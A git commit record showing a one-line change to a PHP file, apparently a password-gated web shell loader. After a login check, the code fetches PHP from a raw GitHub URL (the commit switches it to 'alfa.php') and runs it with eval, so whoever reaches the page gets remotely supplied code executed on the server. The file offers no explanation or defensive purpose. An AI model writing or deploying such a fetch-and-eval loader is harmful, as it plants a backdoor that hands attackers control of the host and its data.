5767ed2062e98f74c2a301de671514137c05cccb
zivanaoktora <142502775+zivanaoktora@users.noreply.github.com>
2024-03-04 15:09:43 +0700

    Alies.php

--- Alies.php
+++ Alies.php
@@ -33,7 +33,7 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/alfabepas.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/zivanaoktora/lock-geek/main/alfa.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
